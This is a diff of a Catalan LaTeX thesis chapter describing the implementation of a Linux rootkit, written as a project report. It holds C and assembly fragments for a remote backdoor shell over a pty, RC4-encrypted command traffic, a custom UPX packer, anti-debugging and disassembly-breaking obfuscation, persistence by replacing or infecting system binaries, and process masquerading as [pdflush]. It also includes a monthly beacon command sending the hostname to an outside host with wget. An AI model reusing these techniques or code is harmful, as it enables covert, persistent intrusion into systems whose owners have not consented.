@@ -1,9 +1,17 @@
 \chapter{Solució}
 
-En aquest apartat es mostra en detall com s'han aconseguit les diferents funcionalitats que ens havíem plantejat de bon principi.
-Com hem anat veient, les funcionalitats estan disponibles depenent del nivell de privilegis de què disposem. \\
+En aquest capítol es mostra amb detall com s'han aconseguit les diferents funcionalitats que ens havíem 
+plantejat de bon principi. En ell es comenten els detalls de codi més significatius per a la funcionalitat
+tot adjuntant-los quan és necessari. \\
 
-Si sorgeix qualsevol dubte sobre l'objectiu d'alguna funcionalitat, es pot anar a la secció FUNCIONALITATS per tal de recordar amb més 
+Cal tenir el compte que tot i el reaprofitament de codi, per a realitzar aquest rootkit, s'han hagut de 
+picar més de vuit mil línies. Això implica que hi han moltes parts que no apareixen en aquest document, i
+per tant, si es vol aprofondir més en algun punt és necessari haver d'anar a consultar directament el codi 
+font. \\
+
+Com hem anat veient, les funcionalitats estan disponibles depenen del nivell de privilegis de què disposem. \\
+
+Si sorgeix qualsevol dubte sobre l'objectiu d'alguna funcionalitat, es pot anar al capítol \ref{cap:funcionalitats} per tal de recordar amb més 
 detall el perquè d'una funcionalitat concreta. \\
 
 \section{Entorn no privilegiat}
@@ -11,11 +19,11 @@ detall el perquè d'una funcionalitat concreta. \\
 \subsection{Executable ELF estàtic}
 
 Per tal d'aconseguir crear un executable estàtic, s'ha utilitzat una llibreria opensource anomenada 
-\href{http://www.google.es/url?sa=t&source=web&ct=res&cd=1&url=http%3A%2F%2Fwww.fefe.de%2Fdietlibc%2F&ei=zZRQStz4PMWrjAftmrinBQ&usg=AFQjCNFno9JYqJ06mbfgwKIZS5J-6zPYEw&sig2=WuvuDzhCaMMslcwtL4xa2A}{dietlibc}
-aquesta llibreria és compatible amb la majoria de sistemes UNIX, i està pensada per a crear executables estàtics d'un tamany 
+\href{http://www.google.es/url?sa=t&source=web&ct=res&cd=1&url=http%3A%2F%2Fwww.fefe.de%2Fdietlibc%2F&ei=zZRQStz4PMWrjAftmrinBQ&usg=AFQjCNFno9JYqJ06mbfgwKIZS5J-6zPYEw&sig2=WuvuDzhCaMMslcwtL4xa2A}{\mbox{dietlibc}}.
+Aquesta llibreria és compatible amb la majoria de sistemes UNIX, i està pensada per a crear executables estàtics d'un tamany 
 molt reduït. \\
 
-Aquesta llibreria implementa gairebé les mateixes funcions que glibc, i per tant, ens permet decidir utilitzar-la sense gaires canvis en la manera de programar. Fer servir aquesta llibreria
+Aquesta llibreria implementa gairebé les mateixes funcions que la glibc, i per tant, el fet d'utilitzar-la no ens obliga a gaires canvis en la manera de programar. Fer servir aquesta llibreria
 ens lliga a programar el rootkit amb el llenguatge de programació C, però aquesta ja és una elecció que havíem pres de bon principi, ja que per a treballar tant a baix nivell,
 necessitem un llenguatge de les característiques del C.\\
 
@@ -28,12 +36,12 @@ Per tal d'utilitzar aquesta llibreria, ens caldrà incloure-la i compilar-la d'u
 \label{fig:cflags}
 \end{figure}
 
-Els flats \ref{cflags} fan que el compilador no inclogui les funcions estandard, i que optimitzi el codi 
+Els flags \ref{fig:cflags} fan que el compilador no inclogui les funcions estandard, i que optimitzi el codi 
 per a què l'executable final ocupi el mínim possible.
 
 \subsection{Multiplataforma i multiarquitectura}
 
-Per tal de que el nostre rootkit sigui multiplataforma i multiarquitectura, ens cal anar amb molta cura alhora de programar les 
+Per a que el nostre rootkit sigui multiplataforma i multiarquitectura, ens cal anar amb molta cura alhora de programar les 
 seves funcionalitats. En el nostre cas, hem utilitzat en tot moment les funcions definides en l'estandard POSIX, d'aquesta manera a l'hora de provar el nostre rootkit en les diferents arquitectures, els canvis que hem hagut de realitzar, han estat mínims. Detalls com el tamany dels punters, ens afecten directament alhora de la creació
 del rootkit, ja que varien entre arquitectures. \\
 
@@ -47,10 +55,10 @@ l'estandard POSIX.
 
 \subsection{Connexió}
 
-Tal i com hem vist en el disseny del mode de comunicació TCP (REFERENCIA), el rootkit és capaç de quedar-se 
+Tal i com hem vist en el disseny del mode de comunicació TCP \ref{sec:TCP}, el rootkit és capaç de quedar-se 
 esperant rebre una connexió a un port TCP per part del client. \\
 
-Podem veure en la figura \ref{fig:client_tcp_action2} que per a fer això, primer ens cal inicialitzar el paquet (REFERENCIA) de control amb els passwords corresponents, i un cop inicialitzat, enviar-lo cap al launcher per a començar a executar l'acció escollida: 
+Podem veure en la figura \ref{fig:client_tcp_action2} que per a fer això, primer ens cal inicialitzar el paquet \ref{sec:paquet} de control amb els passwords corresponents, i un cop inicialitzat, enviar-lo cap al launcher per a començar a executar l'acció escollida: 
 
 \begin{figure}[htp]
 \begin{Verbatim}[commandchars=@\[\]]
@@ -70,8 +78,11 @@ do_action(action, sock, sock, file);
 
 \subsection{Obtenció d'una shell i un TTY}
 
-Per a l'obtenció d'una shell lligada a un tty, només ens cal tenir disponible una shell en el sistema. En aquest cas, just després
-d'establir la connexió, el launcher fa un fork per tal de poder gestionar amb un procés exclusiu la connexió i la shell. Això ho podem veure a la figura \ref{fig:launcher_do_action} just abans de la crida ``launcher\_shell''. Podem veure en aquesta mateixa figura que depenent de l'usuari que executi el codi, el rootkit utilitzarà un raw socket o no. Aquest detall s'explica en detall més endabant. (REFERENCIA)
+Per a l'obtenció d'una shell lligada a un tty, només ens cal tenir disponible una shell en el sistema o haver compilat el
+nostre rootkit, tot afegint-hi la nostre pròpia shell. En aquest cas, just després
+d'establir la connexió, el launcher fa un fork per tal de poder gestionar amb un procés exclusiu la connexió i la shell. Això ho podem veure a la figura \ref{fig:launcher_do_action}, just abans de la crida launcher\_shell(). Podem veure en aquesta mateixa figura que depenent de l'usuari que executi el codi, el rootkit utilitzarà un raw socket o no. Això és perquè l'acció 
+SHELL, només s'executa en mode RAW i en mode TCP. En mode RAW, el rootkit s'està executant com a usuari privilegiat, i en
+mode TCP no.
 
 \begin{figure}[htp]
 \begin{Verbatim}[commandchars=@\[\]]
@@ -86,9 +97,7 @@ d'establir la connexió, el launcher fa un fork per tal de poder gestionar amb u
     } @PYay[else] {
         @PYay[if] (fork()) @PYay[return];
         launcher_shell(sock, sock);
-        close(sock);
-    }
-    @PYay[break];
+        close(sock); }
 \end{Verbatim}
 \caption{launcher.c::do\_action()}
 \label{fig:launcher_do_action}
@@ -123,7 +132,7 @@ tty @PYbe[=] open(ptsname(pty), O_RDWR);
 \label{fig:launcher_launcher_shell}
 \end{figure}
 
-Un cop fet això, només falta lligar la connexió amb l'altre extrem del tty. D'aquesta manera les dades que es vagin rebent per la xarxa, es facin arribar a la shell, i les que envia la shell com a sortida, s'enviin de tornada a través de la xarxa. Podem veure això a la figura \ref{fig:client_client_shell} on es comproba dintre un bucle infinit si hi han dades en el descriptor 0 (entrada estandard) o en el descriptor rsock (descriptor de lectura de la xarxa)
+Un cop fet això, només falta lligar la connexió amb l'altre extrem del tty. D'aquesta manera les dades que es vagin rebent per la xarxa, s'han de fer arribar a la shell, i les que envia la shell com a sortida, s'han d'enviar de tornada. Podem veure això a la figura \ref{fig:client_client_shell} on es comproba dintre un bucle infinit si hi han dades en el descriptor 0 (entrada estandard) o en el descriptor rsock (descriptor de lectura de la xarxa)
 
 \begin{figure}[htp]
 \begin{Verbatim}[commandchars=@\[\]]
@@ -152,8 +161,9 @@ Un cop fet això, només falta lligar la connexió amb l'altre extrem del tty. D
 
 \subsection{Mode comanda / Mode servei}
 
-Tal com hem vist anteriorment (REFERENCIA), podem veure que aquest mode s'escull tot llançant el launcher
-amb dos paràmetres, i que en aquest cas és el launcher qui es connecta al client \ref{fig:launcher_main}.
+Com hem vist anteriorment, podem veure que aquest mode s'escull tot llançant el launcher
+amb dos paràmetres, i que en aquest cas tal i com es mostra en la figura \ref{fig:launcher_main},
+és el launcher qui es connecta al client.
 
 \begin{figure}[htp]
 \begin{Verbatim}[commandchars=@\[\]]
@@ -213,7 +223,8 @@ Per a transferir fitxers entre client i servidor, es segueix gairebé el mateix 
 Ambdós casos, en un cantó de la transmisió, caldrà obrir el fitxer, llegir-lo i enviar-lo. En l'altre part,
 caldrà crear un fitxer i començar a ompliar-lo amb les dades rebudes. \\
 
-En el moment en què no es reven més dades, es tanca la connexió, i el fitxer ja és apunt de ser utilitzat.
+Veiem en la figura \ref{fig:client_client_upload}, que mentre es van llegint dades, aquestes són transferides fins arribar
+al moment en què ja no hi han més dades disponibles, que llavors es tanca la connexió. Un cop tancada, el fitxer ja és apunt de ser utilitzat.
 
 \subsection{Comunicació xifrada}
 
@@ -245,14 +256,14 @@ que ofereix.
 }
 \end{Verbatim}
 
-    \caption{rc4.c - funció per xifrar/desxifrar}
+    \caption{rc4.c::rc4() - funció per xifrar/desxifrar}
     \label{fig:rc4_rc4}
 \end{figure}
 
-Per tal d'utilitzar-lo, ens cal que tant el launcher com el client es trobin amb el mateix estat perquè així
-el contingut xifrat i desxifrat, sigui el mateix ambdós cantons. Per aconseguir això, cal que inicialitzem
+Per utilitzar-lo, ens cal que tant el launcher com el client es trobin en el mateix estat, perquè així,
+el contingut xifrat i desxifrat sigui el mateix a ambdós cantons. Per aconseguir això, cal que inicialitzem
 dues estructures de control, una la utilitzarem per a xifrar i l'altre per a desxifrar. D'aquesta manera, 
-assegurarem que en el moment que anem a desxifrar les dades que hem rebut, tenim el mateix estat que el 
+assegurarem que en el moment que anem a desxifrar les dades que hem rebut, tenim el mateix estat que tenia el 
 launcher en el moment que ha xifrat.
 
 \begin{figure}[htp]
@@ -264,7 +275,7 @@ rc4_init((@PYaJ[unsigned] @PYaJ[char] @PYbe[*])KEY, @PYay[sizeof](KEY), @PYbe[&]
     \label{fig:rc4_inits}
 \end{figure}
 
-Apart d'aquesta inicialització, cal que en els diferents punts del codi on es transfereixen i on es reben 
+Apart d'aquesta inicialització \ref{fig:rc4_inits}, cal que en els diferents punts del codi on es transfereixen i on es reben 
 dades, s'utilitzin les funcions de xifrar i desxifrar amb l'estructura de control corresponent. \\
 
 Si en fixem en l'anterior figura \ref{fig:client_client_shell} veurem que les dades són desxifrades just després de rebre-les
@@ -277,9 +288,9 @@ què haurà d'utilitzar el client alhora de voler llançar accions sobre un altr
 contrasenya escollida, se'n derivaran tres claus diferents. 
 
 \begin{description}
-    \item[CLIENTAUTH] És la requerida per el launcher per a què un paquet enviat pel client sigui considerat 
+    \item[CLIENTAUTH] És la requerida pel launcher per a què un paquet enviat pel client sigui considerat 
         vàlid.
-    \item[SERVERAUTH] És la requerida per el client per a què un paquet enviat pel launcher sigui considerat
+    \item[SERVERAUTH] És la requerida pel client per a què un paquet enviat pel launcher sigui considerat
         vàlid.
     \item[RC4KEY] És la clau utilitzada per l'algoritme rc4 per xifrar el contingut dels paquets.
 \end{description}
@@ -296,8 +307,8 @@ En la figura \ref{fig:config} es veu la definició d'aquestes variables en el fi
     \label{fig:config}
 \end{figure}
 
-En el client, la contrasenya és sol·licitada en el moment d'executar-se. Llavors, en el client 
-s'inicialitzen les diferents claus en base a la contrasenya entrada.
+En la part client, la contrasenya és sol·licitada en el moment d'executar-se. És llavors quan s'inicialitzen les 
+diferents claus en base a la contrasenya entrada.
 
 \begin{figure}[htp]
 \begin{Verbatim}[commandchars=@\[\]]
@@ -319,11 +330,15 @@ printf(@PYaB["]@PYao[\n]@PYaB["]);
     \caption{client.c::get\_pass()}
     \label{fig:client_get_pass}
 \end{figure}
- 
+
+Podem veure a la figura \ref{fig:client_get_pass}, que aquestes tres claus depenen de la clau inicial, i que la segona és generada a partir de la 
+primera, així com la tercera a partir de la segona. Obtinguda una d'aquestes claus, o és possible obtenir les altres,
+a cada generació s'ha combinat l'algoritme sha1 amb una xor de la paraula entrada inicialment.
+
 \subsection{Detecció del rootkit}
 Per tal de detectar si hi ha un rootkit en execució en una màquina remota, s'ha implementat una acció
 que pot ser executada independentment del password utilitzat. Com s'ha comentat en punts
-anteriors, cada cop que el launcher rep un paquet del tamany exacte, aquest n'extreu de la capçalera, 20 
+anteriors, cada cop que el launcher rep un paquet del tamany exacte, aquest n'extreu de la capçalera 20 
 bytes i els compara amb el password que ell té. \\
 
 \begin{figure}[htp]
@@ -348,20 +363,20 @@ bytes i els compara amb el password que ell té. \\
     \label{fig:raw_daemon}
 \end{figure}
 
-Tal i com es pot veure en la figura \ref{fig:raw_daemon}, si un d'aquests paquets no conté el password correcte, també
+Com es pot veure a la figura \ref{fig:raw_daemon}, si un d'aquests paquets no conté el password correcte, també
 es comprova si és un paquet de detecció. En cas de ser-ho, es respon per tal de donar a conèixer que 
-efectivament en la màquina hi ha el launcher en execució. \\
+efectivament en la màquina hi ha un launcher en execució. \\
 
 \subsection{Proteccions de l'executable}
 \subsubsection{Xifratge de l'executable}
 La primera tècnica utilitzada consisteix en xifrar l'executable per a fer-ne més difícil l'anàlisi. La idea 
-és acabar tenint l'executable original xifrat, però afegint al principi de tot, un codi capaç de, en temps 
-d'execució, recuperar en memòria l'executable inicial. Un cop l'executable inicial està desxifrat en memòria,
+és acabar tenint l'executable original xifrat, però afegint al principi de tot, un codi capaç de desxifrar-lo en temps 
+d'execució. Un cop l'executable inicial està desxifrat en memòria,
 caldrà continuar l'execució en ell per seguir tal i com faria l'executable original. \\
 
-Un altre punt que ens interessa, és la impossibilitat per part d'un tercer de desxifrar l'executable per 
-tal d'analitzar-lo sense aquesta protecció. Per aquest motiu, no es podia utilitzar cap codi existent
-dels què n'existeix també l'eina per a desxifrar. \\
+Un altre punt que ens interessa, és que no sigui possible desxifrar l'executable per part d'un tercer que el vulgui 
+analitzar sense aquesta protecció. Per aquest motiu, no es podia utilitzar cap programa existent que ens fes això
+ja que alhora n'existeix també l'eina per a desxifrar-lo. \\
 
 Per tal d'aconseguir aquestes funcionalitats, es va optar per acabar modificant 
 l'última versió del packer UPX\footnote{\href{http://upx.sourceforge.net/}{Ultimate Packer for eXecutables}: 
@@ -371,26 +386,26 @@ comprimeix l'executable, i que a més, només és descomprimible per nosaltres. 
 Amb aquesta tècnica, aconseguim que per tal d'analitzar l'executable xifrat, només tinguem dues possibilitats: 
 \begin{itemize}
 	\item Intentar volcar la memòria, i analitzar aquest volcatge.
-	\item Debugar el codi directament en memòria i mentre està sent executat.
+	\item Debugar el codi directament en memòria mentre està sent executat.
 \end{itemize}
 
-Les millores eines d'anàlisi de binaris, necessiten un executable per tal de començar a treballar. Algunes
+Les millors eines d'anàlisi de binaris necessiten un executable per començar a treballar. Algunes
 també permeten treballar amb volcats de memòria, però mai podran mostrar la mateixa quantitat d'informació
 ni permetran fer servir les mateixes eines d'anàlisi que quan es disposa de l'executable inicial. En resum,
 el què voldrà fer un analista que estigui treballant sobre el nostre executable, és reconstruir un ELF 
 a partir de la memòria, per poder així treballar còmodament. \\
 
-Fins fa relativament poc, no existia cap eina pública que permetés fer això en sistemes actuals. Per tal 
-de poder aprofundir més en el projecte i durant el transcurs d'aquest, em vaig disposar a implementar-ne una.
+Fins fa relativament poc, no existia cap eina pública que permetés fer això en sistemes actuals. Per  
+poder aprofundir més en el projecte i durant el transcurs d'aquest, em vaig disposar a implementar-ne una.
 Aquesta eina l'anomeno skpd\footnote{\href{http://www.wekk.net/skpd/}{skpd}: sk Process Dump, utilitat per
-construir un ELF executable a partir d'un procés en execució} i permet fer justament això: volcar un procés 
-que estigui en execució a la nostre màquina, i construir un ELF per tal que aquest procés torni a ser llançat. 
+construir un ELF executable a partir d'un procés en execució.} i permet fer justament això: volcar un procés 
+que estigui en execució a la nostre màquina, i construir un ELF que permet que aquest procés pugui tornar a ser llançat. 
 
 \subsubsection{Modificació de l'estat}
 Tal i com s'ha vist en el punt anterior, la millor opció és intentar reconstruir un ELF a partir del
 procés en execució. \\
 
-Aquesta tècnica de modificar l'estat, és aplicada per a posar-ho més difícil, i que llavors aquest 
+Aquesta tècnica de modificar l'estat és aplicada per a posar-ho més difícil, i que llavors aquest 
 executable reconstruït o el codi volcat no pugui funcionar directament. \\
 
 \begin{figure}[htp]
@@ -406,8 +421,8 @@ executable reconstruït o el codi volcat no pugui funcionar directament. \\
 \end{figure}
 
 Com veiem al codi de la figura \ref{fig:antidebug_modificar_estat}, tracta de crear una variable global que el compilador la situarà a la secció
-.bss de l'ELF. L'execució d'aquest codi, mai entrarà dintre l'if, ja que al ser llançat el main, la variable 
-``simple\_anti\_spkd'' valdrà ``1'', i només valdrà ``0'' després quan ja mai més és torna a checkejar. \\
+.bss de l'ELF. L'execució d'aquest codi mai entrarà dintre l'if, ja que al ser llançat el main, la variable 
+``simple\_anti\_spkd'' valdrà ``1'', i només valdrà ``0'' després quan ja mai més es torna a comprovar. \\
 
 La utilitat d'aquest tros de codi apareix quan ens plantegem volcar la memòria en un punt de l'execució del 
 programa. Si un cop aquest programa s'està executant, en capturem la memòria, el valor de la 
@@ -419,11 +434,11 @@ Per un analista no avançat, molt probablement significarà que la reconstrucci�
 o almenys, que no és capaç d'executar-lo.
 
 \subsubsection{Evitar el debug}
-Per tal d'evitar que ens debuguin el rootkit, aquest contínuament utilitza el signal TRAP (que és el 
-què utilitzen els debugers per funcionar). D'aquesta manera el nostre rootkit durant el seu normal 
-funcionament, anirà setejant el signal handler per els traps, i llançant interrupcions. Si no és el seu 
+Per evitar que ens debuguin el rootkit, aquest contínuament utilitza el signal TRAP (que és el 
+què utilitzen els debugers per funcionar). D'aquesta manera el nostre rootkit durant el seu 
+funcionament normal, anirà setejant el signal handler pels traps, i llançant interrupcions. Si no és el seu 
 signal handler el qui captura la interrupció, aquest provocarà un segmentation fault per finalitzar
-de forma sospitosa per el possible analitzador.
+de forma sospitosa pel possible analitzador.
 
 \begin{figure}[htp]
 \begin{Verbatim}[commandchars=@\[\]]
@@ -443,8 +458,8 @@ de forma sospitosa per el possible analitzador.
 \end{figure}
 
 \subsubsection{Ofuscar el codi}
-La última tècnica utilitzada per a protegir el nostre rootkit, és utilitzada per ofuscar el codi del nostre
-executable. L'objectiu d'aquesta tècnica és dificultar l'anàlisi del codi ja que el què fem, és introduir
+L'última tècnica utilitzada per a protegir el nostre rootkit, és utilitzada per ofuscar el codi del nostre
+executable. L'objectiu d'aquesta tècnica és dificultar l'anàlisi del codi, ja que el què fem és introduir
 en el codi, salts a posicions que no poden ser resoltes estàticament.  \\
 
 \begin{figure}[htp]
@@ -465,24 +480,29 @@ en el codi, salts a posicions que no poden ser resoltes estàticament.  \\
 @PYaN[        ".long 0\n" \]
 @PYaN[        "popl %eax\n" \]
 @PYaN[        );]
-@PYaN[#]@PYaN[endif]
 \end{Verbatim}
 \caption{antidebug.h}
 \label{fig:antidebug_obfuscate}
 \end{figure}
 
-Per tal de poder aconseguir aquesta obuscació a tant baix nivell, ens cal utilitzar ensamblador per a 
-aplicar aquestes tècniques. \\
+Per tal de poder aconseguir aquesta obuscació a tant baix nivell, ens cal utilitzar llenguatge ensamblador. \\
 
-Com podem veure a la figura \ref{fig:antidebug_obfuscate}, el què fem, és calcular l'adreça de just 
-després del nostre codi, i saltar fent servir aquest punter. Això implica que el programes que analitzen
-el flux del codi, es perdin en aquest punt, i no sàpiguen com continuar ja que aquest salt només serà 
-resolt en temps d'execució. \\
+Com podem veure a la figura \ref{fig:antidebug_obfuscate}, el què fem és calcular l'adreça que tenim just 
+després del nostre codi, i saltar fent servir aquest punter. El call reloc ens deixa a la pila l'adreça de 
+retorn, que és exactament l'adreça de memòria on es troba la instrucció popl \%eax. Després, en la operació
+addl es calcula la distància entre l'etiqueta data i l'etiqueta reloc, i se li suma a la direcció de memòria
+que hem obtingut anteriorment més 4. Aquest càlcul ens retorna la direcció just després d'on hi ha el .long 0 
+que són 4 bytes a 0. El jmp *\%eax fa que l'execució salti a aquest punt. \\
 
-Una altre tècnica que s'implementa en el mateix tros de còdi, és la de injecció de bytes per a enganyar el
+Tot això implica que els programes que analitzen
+el flux del codi estàticament, no puguin seguir el seu anàlisis. Això és degut a que la següent direcció destí
+de la instrucció jmp *\%eax, no es pot saber sense executar les instruccions anteriors. El fet de no poder resoldre aquest
+salt atura l'anàlisi en aquest punt. \\
+
+Una altre tècnica que s'implementa en el mateix tros de còdi, és la d'injecció de bytes per a enganyar el
 desensamblat. Podem veure en la mateixa figura que a la quarta línia, inserim els bytes 0x457c. Fer això
-just en aquest punt, profocarà que els bytes que formen la instrucció call de darrere, siguin utilitzats
-juntament amb el 0x457c trencant així el ``call'', i mostran un ``movl \$0x0,-0x18(\%ebp)''. \\
+just en aquest punt, provocarà que els bytes que formen la instrucció call de darrere, siguin utilitzats
+juntament amb el 0x457c, trencant així el ``call'' i mostran un ``movl \$0x0,-0x18(\%ebp)''. \\
 
 En la figura \ref{fig:antidebug_obfuscate2} es pot veure el resultat de desensamblar la figura \ref{fig:antidebug_obfuscate}
 
@@ -503,13 +523,13 @@ En la figura \ref{fig:antidebug_obfuscate2} es pot veure el resultat de desensam
 	\label{fig:antidebug_obfuscate2}
 \end{figure}
 
-Finalment comentar que aquestes dues tècniques també shan aplicat en tot el codi del rootkit.
+Finalment comentar que aquestes dues tècniques també s'han aplicat en tot el codi del rootkit.
 
 \subsection{Supervivència del rootkit}
 Per tal d'aconseguir que el nostre rootkit torni a arrancar, tenim diferents opcions:
 \begin{itemize}
 \item Colocar un script amb els scripts d'inici del sistema per a què s'arranqui amb el SO.
-\item Substituir un executable del sistema, per un wrapper nostre.
+\item Substituir un executable del sistema per un wrapper nostre.
 \item Infectar un executable del sistema per a què en cada execució també executi el nostre programa.
 \end{itemize}
 
@@ -519,102 +539,105 @@ col·locant un script al directori d'arrancada com per exemple /etc/rc3.d/ amb e
 d'intentar passar desaparcebuts. Al reiniciar el sistema, el nostre rootkit seria executat.
 
 \subsubsection{Substituir executable}
-Una segona opció, seria renombrar un executable de sistema com podria ser /sbin/getty per algo com /sbin/agetty,
+Una segona opció seria renombrar un executable de sistema com podria ser /sbin/getty per algo com /sbin/agetty,
 i posar al seu lloc un executable nostre que executés el nostre rootkit, i que alhora llancés el programa 
 original. 
 
 \subsubsection{Infecció d'un executable}
-Una tècnica més avançada, seria infectar un executable per a que ell mateix executés el rootkit just abans 
+Una tècnica més avançada seria infectar un executable per a que ell mateix executés el rootkit just abans 
 d'executar-se. Aquest executable també hauria de ser de sistema, ja que ens interessarà que el nostre rootkit
 s'executi com a usuari root.
 
 \subsection{Tasques programades}
-Per tal de portar a terme les tasques programades, el rootkit intenta llançar un script anomenat .daily, .weekly, o .monthly amb la periodicitat que el propì 
-nom de l'arxiu ens indica. Aquesta execució es realitza programant un alert diàriament tot incrementant uns contadors de tal manera que quan hagi passat el temps, s'executarà l'script necessari utilitzant la crida ``system()'' 
+Per portar a terme les tasques programades, el rootkit intenta llançar un script anomenat .daily, .weekly, o .monthly amb la periodicitat que el propi
+nom de l'arxiu ens indica. Aquesta execució es realitza programant un alert diàriament, tot incrementant uns contadors de tal manera que quan hagi passat el temps, s'executarà l'script necessari utilitzant la crida ``system()'' 
 
 Aquests scripts els busca en el directory arrel del home del rootkit (també demanat en el moment de la configuració), i en cas de no ser-hi, no passa res.
   
 \subsection{Ocultació}
-Per tal d'evitar que el rootkit sigui detectat, s'han implementat diferents tècniques:
+S'han implementat diferents tècniques per evitar que el  rootkit sigui detectat:
 \begin{enumerate}
 \item Executable i nom de procés igual que una runqueue del kernel de LINUX. \\
-Per tal de passar desapercebut, el fitxer s'anomena pdflush. D'aquesta manera, la sortida de la comanda top, 
+Per passar desapercebut, el fitxer s'anomena pdflush. D'aquesta manera, la sortida de la comanda top
 visualitza igual les runqueues que el nostre procés. A més, l'executable quan és llençat, modifica la posició de memòria on es troba el nom del procés, i en canvia el contingut
 per a [pdflush], que és com es representa la runqueue del kernel de Linux. Aquest nom és escollit en temps de compilació, i pot ser qualsevol altre per tal de permetre al
 rootkit adoptar un altre nom per a amagar-se en altres sistemes operatius.
 
 \begin{figure}[htp]
 \begin{Verbatim}[commandchars=@\[\]]
-    @PYaJ[void] @PYaL[rename_proc](@PYaJ[char] @PYbe[*]@PYbe[*]argv, @PYaJ[int] argc) {
-        @PYaJ[int] i;
-        @PYay[for] (i @PYbe[=] @PYag[0]; i @PYbe[<] argc; i@PYbe[+]@PYbe[+]) {
-            memset(argv@PYZlb[]i@PYZrb[], @PYag[0], strlen(argv@PYZlb[]i@PYZrb[]));
-            realloc(argv@PYZlb[]i@PYZrb[], strlen(PROCNAME)@PYbe[+]@PYag[1]);
-            memcpy(argv@PYZlb[]i@PYZrb[], PROCNAME, strlen(PROCNAME)@PYbe[+]@PYag[1]);
-        }
-}
+@PYaJ[void] @PYaL[rename_proc](@PYaJ[char] @PYbe[*]@PYbe[*]argv, @PYaJ[int] argc) {
+    @PYaJ[int] i;
+    @PYay[for] (i @PYbe[=] @PYag[0]; i @PYbe[<] argc; i@PYbe[+]@PYbe[+]) {
+        memset(argv@PYZlb[]i@PYZrb[], @PYag[0], strlen(argv@PYZlb[]i@PYZrb[]));
+        realloc(argv@PYZlb[]i@PYZrb[], strlen(PROCNAME)@PYbe[+]@PYag[1]);
+        memcpy(argv@PYZlb[]i@PYZrb[], PROCNAME, strlen(PROCNAME)@PYbe[+]@PYag[1]);
+    }
 \end{Verbatim}
     \caption{launcher.c::rename\_proc()}
     \label{fig:laucner_rename_proc}
 \end{figure}
 
-\item Executable no referenciat des de /proc/self/exe, i chdir a / . \\
-Per tal que de si algú sospita del procés no es trobin pistes de què realment no és un procés intern del sistema operatiu, just al arrancar el procés,
-aquest canvia de directori al directori arrel. Un cop llançat el procés, aquest es mapeja en una altre posició de memòria, i elimina les antigues pàgines. D'aquesta manera, aconsegueix eliminar la referència de /proc/self/exe, i que llavors aquest no apunti a l'executable en qüestió. 
+\item Executable no referenciat des de /proc/self/exe, i chdir a l'arrel (directori /). \\
+Per si algú sospita del nostre procés, ens interessa que no es trobin pistes de què realment no és un procés intern del sistema operatiu. Per aquest motiu, just al arrancar el rootkit,
+aquest canvia de directori i passa al directori arrel. Un cop ja es troba en execució, aquest es mapeja en una altre posició de memòria, i elimina les antigues pàgines. D'aquesta manera, 
+aconsegueix eliminar la referència de /proc/self/exe, i així posar-ho més dificil alhora de intentar localitzar on està l'executable en qüestió. 
 
 \item Localització física del fitxer. \\
-Per tal que el fitxer estigui força amagat, s'ha  buscat un path al sistema on rarament s'hi accedeixi. El
+Per que el fitxer estigui força amagat, s'ha  buscat un path al sistema on rarament s'hi accedeixi. El
 path escollit per defecte és /usr/share/zoneinfo/posix/America/Indiana/. / i és possible canviar-lo en 
 les opcions de compilació.
 \item Comunicació xifrada. \\
-Un altre mètode d'ocultació és el fet de xifrar tot el trànsit que passa per la xarxa, de tal manera que ningú pogués veure de forma accidental o 
+Un altre mètode d'ocultació és xifrar tot el trànsit que passa per la xarxa, de tal manera que ningú pogui veure de forma accidental o 
 intencionada, que és el què està viatjant per la xarxa.
 \item Eliminació de les variables d'entorn. \\
-Al ser executat, el launcher elimina tota variable d'entorn per tal que no es pugui tenir cap pista de què és el procés.
+Al ser executat, el launcher elimina tota variable d'entorn per tal de que no es pugui tenir cap pista de què és el procés.
+\item Connexions de xarxa no visibles. \\
+Si s'utilitza el mode de comunicació raw, les connexions de xarxa no seran visibles des del sistema operatiu. L'única 
+manera de donar-se compte d'elles seria analitzant el trànsit de xarxa.
 \end{enumerate} 
 
  
 \subsection{Heard beat}
 Per implementar el heard beat, s'han utilitzat les tasques programades de periodicitat mensual. En l'script
-.monthly, s'ha afegit la comanda de la figura XXX
+.monthly, s'ha afegit la comanda:
 
 \begin{Verbatim}[commandchars=@\[\]]
 wget -q hostru.mine.nu/index.php?h@PYbe[=]@PYay[$(]hostname@PYay[)]
 \end{Verbatim}
 
-Aquesta comanda, s'executarà mensualment, i realitzarà una petició contra una pàgina web, allotjada en un
+Aquesta comanda s'executarà mensualment, i realitzarà una petició contra una pàgina web, allotjada en un
 servidor gratuït. Al realitzar la petició, aquesta quedarà contabilitzada juntament amb el hostname i la ip
 on es troba el rootkit.
 
 \subsection{Independència de la shell}
 Per a aconseguir que el rootkit no depengui de quina shell té instal·lada el sistema on s'està executant, 
-s'ha modificat la shell dash\footnote{shell basada en ash, reescrita per debian. Té la peculiaritat de ser
-una shell a l'estil sh, però d'un tamany molt reduit} per a poder-se afegir dintre el rootkit. \\
+s'ha modificat la shell dash\footnote{Shell basada en ash, reescrita per debian que té la peculiaritat de ser
+una shell a l'estil sh, però d'un tamany molt reduit.} per a poder-se afegir dintre del rootkit. \\
 
 En el moment en què es compila el rootkit, aquest ens demana si volem incloure una shell dintre seu, i en
-cas de voler, incorpora el codi basat en dash. Com sempre aquest codi també es estàtic i compilat utilitzant
+cas de voler, incorpora el codi basat en dash. Com sempre aquest codi també és estàtic i compilat utilitzant
 la llibreria dietlibc. \\
 
 Els canvis que han estat necessaris per tal d'incloure la shell dash en el rootkit, són uns canvis força
 metòdics i que no aporten gaire valor afegit. En cas d'interessar, es pot consultar directament al codi.\\
 
 \subsection{Proxy socks}
-Per a afegir aquesta funcionalitat al nostre rootkit, s'ha intentat (igual que en el cas anterior), buscar
-un software existent que ens oferis la funcionalitat desitjada. El problema que hem tingut en el cas del servei de
-socks, és que els paquets disponibles, ofereixen moltíssimes altres funcionalitats que nosaltres no
-necessitem. Aquest mateix fet, feia molt costós el modificar el codi per a tenir un servei socks simple, i 
+Per a afegir aquesta funcionalitat al nostre rootkit, s'ha intentat (igual que en el cas anterior) buscar
+un software existent que ens ajudés una mica a afegir-hi la funcionalitat. El problema que hem tingut en el cas del servei de
+socks és que els paquets disponibles ofereixen moltíssimes altres funcionalitats que nosaltres no
+necessitem. Aquest mateix fet feia molt costós el modificar el codi per a tenir un servei socks simple, i 
 per aquest motiu s'ha decidit implementar des de zero tot el protocol. Cal tenir en compte però,
-que el protocol socks, és un protocol força senzill. \\
+que el protocol socks és un protocol força senzill. \\
 
-El primer a fer, ha estat buscar les especificacions formals del protocol\footnote{Les especificacions 
